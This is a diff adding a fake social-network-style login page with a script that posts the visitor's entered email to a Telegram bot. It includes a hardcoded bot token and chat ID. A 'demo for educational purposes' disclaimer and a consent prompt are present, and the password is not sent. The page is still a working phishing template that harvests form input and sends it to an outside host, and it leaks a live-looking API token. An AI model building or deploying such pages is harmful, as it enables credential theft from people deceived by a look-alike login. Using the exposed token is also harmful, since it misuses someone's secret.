@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
+</head>
+<body>
+    <div class="parent">
+        <div class="top">
+            <h1>Login Page</h1>
+            <p>
+                Helps you connect and share with the people in your life. Sign in below.
+            </p>
+        </div>
+        <div class="bottom">
+            <form id="login">
+                <input type="text" id="email" placeholder="Mobile number or email address" class="text" required>
+                <input type="password" id="password" placeholder="Password" class="password" required>
+                <button type="submit" class="submit">Login</button>
+                <a href="#">Forgotten Password?</a>
+                <hr>
+                <a href="#" class="end">Create New Account</a>
+            </form>
+        </div>
+    </div>
+    <p style="text-align: center; font-size: 12px; margin-top: 20px; color: gray;">
+        This is a demo page created for educational purposes only. Not affiliated with any real platform.
+    </p>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7910276703:AAEeeMJOJkte30e94e-49lFpneVVFHFdIC0";  // ضع التوكين هنا
+        const CHAT_ID = "1394204430";  // ضع معرف الشات هنا
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // الحصول على البيانات من المدخلات
+            const email = document.getElementById('email').value;
+
+            // تنبيه للمستخدم مع إخفاء كلمة المرور
+            alert(`Login attempted with:\nEmail: ${email}\nPassword: [hidden for security]`);
+
+            // تأكيد موافقة المستخدم (اختياري)
+            const userConfirmed = confirm("Do you allow sending login information ?");
+
+            if (userConfirmed) {
+                // إرسال البيانات إلى تيليجرام فقط إذا وافق المستخدم
+                const message = ` 
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b> ${email}\n
+                `;
+
+                // طلب API لإرسال الرسالة إلى تيليجرام
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    console.log("Message sent to Telegram.");
+                }).catch(error => {
+                    console.log("Error sending message:", error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
